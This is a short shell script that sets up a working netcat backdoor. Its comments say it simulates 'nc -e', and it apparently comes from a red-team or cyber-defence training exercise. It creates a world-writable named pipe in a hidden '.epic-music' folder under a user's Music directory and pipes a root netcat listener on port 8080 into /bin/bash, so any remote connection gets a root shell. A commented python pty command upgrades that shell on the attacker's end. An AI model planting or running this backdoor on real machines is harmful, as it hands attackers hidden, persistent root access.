#Netcat 8080 backdoor

#Simulates the old "nc -e" command, opens nc backdoor
sudo mkfifo "/home/cp_user/Music/.epic-music/foo"
sudo chgrp sudo "/home/cp_user/Music/.epic-music/foo"
sudo chmod 777 "/home/cp_user/Music/.epic-music/foo"
sudo chmod +x "/home/cp_user/Music/.epic-music/foo"
sudo nc -lk 8080 0<"/home/cp_user/Music/.epic-music/foo" | /bin/bash 1>"/home/cp_user/Music/.epic-music/foo"

#Used by red team to spawn a shell, runs on attacker's end
#python -c 'import pty; pty.spawn("/bin/bash")'
